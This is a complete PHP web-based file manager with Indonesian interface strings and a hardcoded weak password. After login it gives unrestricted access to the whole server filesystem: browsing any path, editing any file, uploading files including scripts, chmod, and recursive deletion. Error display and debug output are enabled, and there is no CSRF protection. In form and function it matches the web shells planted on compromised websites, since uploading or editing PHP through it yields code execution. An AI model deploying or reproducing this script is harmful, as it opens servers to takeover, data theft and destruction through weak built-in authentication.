<?php
// File: filemanager_full_compat.php
// Full-feature File Manager (compatible PHP 5.6+ and PHP 7/8)
// WARNING: Powerful. Use only in trusted environment. Change the password below.

ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);

// ----------------- CONFIG -----------------
$AUTH_PASSWORD = 'memek'; // <<< GANTI PASSWORD INI
$DEBUG = true; // set false di production

session_start();

// Simple auth
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password']) && $_POST['password'] === $AUTH_PASSWORD) {
        $_SESSION['logged_in'] = true;
        header('Location: ' . $_SERVER['PHP_SELF']);
        exit();
    }
    // Login form
    echo '<!doctype html><html><head><meta charset="utf-8"><title>Login</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    </head><body class="d-flex justify-content-center align-items-center vh-100">';
    echo '<form method="POST" class="p-4 border rounded" style="min-width:320px">';
    echo '<h4 class="mb-3">File Manager — Login</h4>';
    echo '<input type="password" name="password" class="form-control mb-3" placeholder="Password" required>';
    echo '<div class="d-grid"><button class="btn btn-primary">Login</button></div>';
    echo '</form></body></html>';
    exit();
}

// ----------------- HELPERS -----------------
function rrmdir($dir) {
    if (!is_dir($dir)) {
        return @unlink($dir);
    }
    $items = @scandir($dir);
    if ($items === false) return false;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($p)) {
            rrmdir($p);
        } else {
            @unlink($p);
        }
    }
    return @rmdir($dir);
}

function flash($msg, $type) {
    if (!isset($_SESSION['flash'])) $_SESSION['flash'] = array();
    $_SESSION['flash'][] = array('msg'=>$msg,'type'=>$type);
}
function show_flash() {
    if (!empty($_SESSION['flash'])) {
        foreach ($_SESSION['flash'] as $f) {
            $c = ($f['type'] == 'danger') ? 'danger' : (($f['type']=='success') ? 'success' : 'secondary');
            echo "<div class='alert alert-{$c}'>{$f['msg']}</div>";
        }
        unset($_SESSION['flash']);
    }
}

function safe_realpath($p) {
    // prefer realpath, but fall back to normalized path if realpath fails
    $r = @realpath($p);
    if ($r === false || $r === null) {
        // normalize dots and double slashes
        $r = preg_replace('#[/\\\\]+#', DIRECTORY_SEPARATOR, $p);
    }
    return $r;
}

function h($s) {
    return htmlspecialchars($s, ENT_QUOTES, 'UTF-8');
}

// ----------------- CURRENT PATH -----------------
$requested = isset($_GET['path']) ? urldecode($_GET['path']) : getcwd();
$path = safe_realpath($requested);
if ($path === false || $path === null || $path === '') $path = getcwd();
$path = rtrim($path, DIRECTORY_SEPARATOR);
if ($path === '') $path = DIRECTORY_SEPARATOR;

// ----------------- HANDLE POST ACTIONS -----------------
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $current = isset($_POST['current_path']) ? safe_realpath(urldecode($_POST['current_path'])) : $path;
    if ($current === false || $current === null) $current = getcwd();

    // DELETE
    if (isset($_POST['action_delete']) && !empty($_POST['target'])) {
        $target = safe_realpath(urldecode($_POST['target']));
        if ($target === false) {
            flash("Target tidak ditemukan.", 'danger');
        } else {
            if (is_dir($target)) {
                if (rrmdir($target)) flash("Folder dihapus: " . h($target), 'success');
                else flash("Gagal menghapus folder: " . h($target), 'danger');
            } else {
                if (@unlink($target)) flash("File dihapus: " . h($target), 'success');
                else flash("Gagal menghapus file: " . h($target), 'danger');
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }

    // RENAME
    if (isset($_POST['action_rename']) && !empty($_POST['target']) && isset($_POST['new_name'])) {
        $target = safe_realpath(urldecode($_POST['target']));
        $new_name = trim($_POST['new_name']);
        if ($target === false || $new_name === '') {
            flash("Invalid rename input.", 'danger');
        } else {
            $dir = dirname($target);
            $dest = $dir . DIRECTORY_SEPARATOR . basename($new_name);
            if (@rename($target, $dest)) flash("Rename berhasil.", 'success'); else flash("Rename gagal.", 'danger');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }

    // CHMOD
    if (isset($_POST['action_chmod']) && !empty($_POST['target']) && isset($_POST['mode'])) {
        $target = safe_realpath(urldecode($_POST['target']));
        $mode_str = trim($_POST['mode']);
        if ($target === false || $mode_str === '') {
            flash("Invalid chmod input.", 'danger');
        } else {
            $mode = intval($mode_str, 8);
            if (@chmod($target, $mode)) flash("Chmod berhasil ($mode_str).", 'success'); else flash("Chmod gagal.", 'danger');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }

    // SAVE (edit file)
    if (isset($_POST['action_save']) && !empty($_POST['target']) && isset($_POST['file_content'])) {
        $target = safe_realpath(urldecode($_POST['target']));
        $content = $_POST['file_content'];
        if ($target === false || !is_file($target)) {
            flash("File tidak ditemukan.", 'danger');
        } else {
            if (@file_put_contents($target, $content) !== false) flash("File disimpan.", 'success'); else flash("Gagal menyimpan file.", 'danger');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode(dirname($target)));
        exit();
    }

    // CREATE FILE
    if (isset($_POST['action_create_file']) && isset($_POST['new_file_name'])) {
        $name = trim($_POST['new_file_name']);
        if ($name === '') {
            flash("Nama file kosong.", 'danger');
        } elseif (!is_writable($current)) {
            flash("Direktori tidak dapat ditulis: " . h($current), 'danger');
        } else {
            $dest = $current . DIRECTORY_SEPARATOR . basename($name);
            if (file_exists($dest)) flash("File sudah ada.", 'danger'); else {
                if (@file_put_contents($dest, isset($_POST['new_file_content']) ? $_POST['new_file_content'] : '') !== false) flash("File dibuat: " . h($dest), 'success');
                else flash("Gagal membuat file.", 'danger');
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }

    // CREATE FOLDER
    if (isset($_POST['action_create_folder']) && isset($_POST['new_folder_name'])) {
        $name = trim($_POST['new_folder_name']);
        if ($name === '') {
            flash("Nama folder kosong.", 'danger');
        } else {
            $dest = $current . DIRECTORY_SEPARATOR . basename($name);
            if (file_exists($dest)) flash("Folder sudah ada.", 'danger'); else {
                if (@mkdir($dest, 0755, true)) flash("Folder dibuat: " . h($dest), 'success'); else flash("Gagal membuat folder.", 'danger');
            }
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }

    // UPLOAD
    if (isset($_FILES['upload_file']) && isset($_POST['current_path'])) {
        $current = safe_realpath(urldecode($_POST['current_path']));
        if ($current === false) $current = getcwd();
        if (!is_writable($current)) {
            flash("Direktori tidak dapat ditulis: " . h($current), 'danger');
        } elseif (isset($_FILES['upload_file']['name']) && $_FILES['upload_file']['name'] !== '') {
            $error = $_FILES['upload_file']['error'];
            if ($error !== UPLOAD_ERR_OK) {
                $msg = 'Upload error: ';
                switch ($error) {
                    case UPLOAD_ERR_INI_SIZE:
                        $msg .= 'File too large (php.ini limit).';
                        break;
                    case UPLOAD_ERR_FORM_SIZE:
                        $msg .= 'File too large (form limit).';
                        break;
                    case UPLOAD_ERR_PARTIAL:
                        $msg .= 'Partial upload.';
                        break;
                    case UPLOAD_ERR_NO_FILE:
                        $msg .= 'No file uploaded.';
                        break;
                    case UPLOAD_ERR_NO_TMP_DIR:
                        $msg .= 'No temporary directory.';
                        break;
                    case UPLOAD_ERR_CANT_WRITE:
                        $msg .= 'Cannot write to disk.';
                        break;
                    case UPLOAD_ERR_EXTENSION:
                        $msg .= 'Extension stopped upload.';
                        break;
                    default:
                        $msg .= 'Unknown error.';
                        break;
                }
                flash($msg, 'danger');
            } else {
                $filename = preg_replace('/[^a-zA-Z0-9\-_.]/', '_', basename($_FILES['upload_file']['name']));
                $target = $current . DIRECTORY_SEPARATOR . $filename;
                if (@move_uploaded_file($_FILES['upload_file']['tmp_name'], $target)) flash("File uploaded: " . h($target), 'success'); else flash("Upload failed.", 'danger');
            }
        } else {
            flash("No file selected.", 'danger');
        }
        header('Location: ' . $_SERVER['PHP_SELF'] . '?path=' . urlencode($current));
        exit();
    }
}

// ----------------- READ DIRECTORY -----------------
$items = @scandir($path);
if ($items === false) $items = array();

?><!doctype html>
<html>
<head>
  <meta charset="utf-8">
  <title>File Manager — Full Actions (Compat)</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { padding: 18px; background:#f7f9fc; }
    .file-actions button { margin-left:6px; }
    .small-muted { font-size:12px; color:#666; }
    .badge-file { min-width:60px; text-align:center; }
  </style>
</head>
<body>
<div class="container">
  <div class="d-flex justify-content-between align-items-center mb-3">
    <h3>🔥 File Manager — Compat</h3>
    <form method="GET" class="d-flex" style="gap:.5rem;">
      <input type="text" name="path" class="form-control" placeholder="/full/path/or/relative" value="<?php echo h($path); ?>">
      <button class="btn btn-secondary">Go</button>
    </form>
  </div>

  <?php show_flash(); ?>

  <div class="card p-3 mb-3">
    <div class="small-muted mb-2">Current Path:</div>
    <div class="d-flex justify-content-between align-items-center">
      <div><strong><?php echo h($path); ?></strong></div>
      <div>
        <?php if ($path !== DIRECTORY_SEPARATOR) { $parent = dirname($path); ?>
          <a class="btn btn-sm btn-outline-secondary" href="?path=<?php echo urlencode($parent); ?>">⬅ Up</a>
        <?php } ?>
        <a class="btn btn-sm btn-outline-danger" href="?path=<?php echo urlencode(getcwd()); ?>">Go to CWD</a>
      </div>
    </div>
  </div>

  <!-- Create forms -->
  <div class="row g-3 mb-3">
    <div class="col-md-6">
      <div class="card p-3">
        <form method="POST">
          <input type="hidden" name="current_path" value="<?php echo urlencode($path); ?>">
          <div class="mb-2"><strong>Create File</strong></div>
          <input name="new_file_name" class="form-control mb-2" placeholder="filename.txt" required>
          <textarea name="new_file_content" class="form-control mb-2" rows="3" placeholder="Initial content (optional)"></textarea>
          <div class="d-flex justify-content-end">
            <button name="action_create_file" value="1" class="btn btn-sm btn-primary">Create File</button>
          </div>
        </form>
      </div>
    </div>
    <div class="col-md-6">
      <div class="card p-3">
        <form method="POST">
          <input type="hidden" name="current_path" value="<?php echo urlencode($path); ?>">
          <div class="mb-2"><strong>Create Folder</strong></div>
          <input name="new_folder_name" class="form-control mb-2" placeholder="folder_name" required>
          <div class="d-flex justify-content-end">
            <button name="action_create_folder" value="1" class="btn btn-sm btn-success">Create Folder</button>
          </div>
        </form>
      </div>
    </div>
  </div>

  <!-- Upload -->
  <div class="card p-3 mb-3">
    <form method="POST" enctype="multipart/form-data">
      <input type="hidden" name="current_path" value="<?php echo urlencode($path); ?>">
      <div class="d-flex">
        <input type="file" name="upload_file" class="form-control">
        <button class="btn btn-primary ms-2">Upload</button>
      </div>
    </form>
  </div>

  <!-- Listing -->
  <div class="card">
    <div class="card-body p-0">
      <table class="table table-hover mb-0">
        <thead class="table-light">
          <tr><th style="width:60%">Name</th><th style="width:15%">Info</th><th style="width:25%">Actions</th></tr>
        </thead>
        <tbody>
        <?php
        if (empty($items)) {
            echo '<tr><td colspan="3" class="text-center py-4 small-muted">Empty or cannot read directory</td></tr>';
        } else {
            foreach ($items as $item) {
                if ($item === '.' || $item === '..') continue;
                $full = $path . DIRECTORY_SEPARATOR . $item;
                $real = safe_realpath($full);
                $is_dir = is_dir($real);
                $size = $is_dir ? '-' : (is_file($real) ? filesize($real) : '-');
                $perm = @fileperms($real);
                $permstr = $perm ? substr(sprintf('%o', $perm), -4) : '----';
                $modified = @filemtime($real) ? date('Y-m-d H:i:s', filemtime($real)) : '-';
                $encoded = urlencode($real);
                echo '<tr>';
                echo '<td>';
                echo '<div>';
                if ($is_dir) {
                    echo '<a href="?path=' . urlencode($real) . '" class="fw-bold">📁 ' . h($item) . '</a>';
                } else {
                    echo '<span>📄 ' . h($item) . '</span>';
                }
                echo '<div class="small-muted">' . h($real) . '</div>';
                echo '</div></td>';
                echo '<td><div><span class="badge bg-light text-dark badge-file">' . ($is_dir ? 'DIR' : 'FILE') . '</span></div>';
                echo '<div class="small-muted mt-1">' . h($permstr) . ' • ' . ($size==='-'?'-':number_format($size)) . ' B</div>';
                echo '<div class="small-muted">' . h($modified) . '</div></td>';
                echo '<td>';
                echo '<div class="d-flex flex-wrap justify-content-end">';
                if (!$is_dir) {
                    echo '<a class="btn btn-sm btn-outline-primary" href="?path=' . urlencode(dirname($real)) . '&edit=' . $encoded . '">Edit</a>';
                } else {
                    echo '<a class="btn btn-sm btn-outline-secondary" href="?path=' . urlencode($real) . '">Open</a>';
                }
                echo '<button class="btn btn-sm btn-outline-info" onclick="toggleForm(\'rename-'.md5($real).'\')">Rename</button>';
                echo '<button class="btn btn-sm btn-outline-warning" onclick="toggleForm(\'chmod-'.md5($real).'\')">Chmod</button>';
                echo '<form method="POST" style="display:inline" onsubmit="return confirm(\'Confirm delete '.addslashes($item).' ?\');">';
                echo '<input type="hidden" name="current_path" value="' . urlencode($path) . '">';
                echo '<input type="hidden" name="target" value="' . $encoded . '">';
                echo '<button name="action_delete" value="1" class="btn btn-sm btn-outline-danger">Delete</button>';
                echo '</form>';
                echo '</div>';

                // rename form
                echo '<form method="POST" id="rename-'.md5($real).'" style="display:none;margin-top:8px;">';
                echo '<input type="hidden" name="current_path" value="'.urlencode($path).'">';
                echo '<input type="hidden" name="target" value="'.$encoded.'">';
                echo '<div class="input-group input-group-sm"><input name="new_name" class="form-control" placeholder="new name"><button name="action_rename" value="1" class="btn btn-sm btn-info">OK</button></div>';
                echo '</form>';

                // chmod form
                echo '<form method="POST" id="chmod-'.md5($real).'" style="display:none;margin-top:8px;">';
                echo '<input type="hidden" name="current_path" value="'.urlencode($path).'">';
                echo '<input type="hidden" name="target" value="'.$encoded.'">';
                echo '<div class="input-group input-group-sm"><input name="mode" class="form-control" placeholder="e.g. 755" pattern="[0-7]{3,4}"><button name="action_chmod" value="1" class="btn btn-sm btn-warning">OK</button></div>';
                echo '</form>';

                echo '</td></tr>';
            }
        }
        ?>
        </tbody>
      </table>
    </div>
  </div>

  <!-- Editor -->
  <?php
  if (isset($_GET['edit'])) {
      $edit_target = safe_realpath(urldecode($_GET['edit']));
      if ($edit_target && is_file($edit_target) && is_readable($edit_target)) {
          $content = @file_get_contents($edit_target);
          echo '<div class="card mt-3"><div class="card-header d-flex justify-content-between align-items-center">';
          echo '<div><strong>Editing:</strong> ' . h($edit_target) . '</div>';
          echo '<div><a href="?path=' . urlencode(dirname($edit_target)) . '" class="btn btn-sm btn-outline-secondary">Back</a></div>';
          echo '</div><div class="card-body">';
          echo '<form method="POST">';
          echo '<input type="hidden" name="target" value="' . urlencode($edit_target) . '">';
          echo '<input type="hidden" name="current_path" value="' . urlencode(dirname($edit_target)) . '">';
          echo '<textarea name="file_content" class="form-control" rows="18" style="font-family:monospace">' . h($content) . '</textarea>';
          echo '<div class="mt-2 d-flex justify-content-end"><button name="action_save" value="1" class="btn btn-success">Save</button></div>';
          echo '</form></div></div>';
      } else {
          echo '<div class="alert alert-danger mt-3">Cannot open file for editing.</div>';
      }
  }
  ?>

  <div class="mt-4 small text-muted">Tip: This interface performs real filesystem operations. Be careful.</div>

  <?php if ($DEBUG): ?>
    <pre class="mt-3" style="font-size:12px;color:gray;">DEBUG:
cwd: <?php echo h(getcwd()); ?>

requested: <?php echo h($requested); ?>

resolved path: <?php echo h($path); ?></pre>
  <?php endif; ?>

</div>

<script>
function toggleForm(id) {
  var el = document.getElementById(id);
  if (!el) return;
  if (el.style.display === 'none' || el.style.display === '') el.style.display = 'block'; else el.style.display = 'none';
}
</script>
</body>
</html>
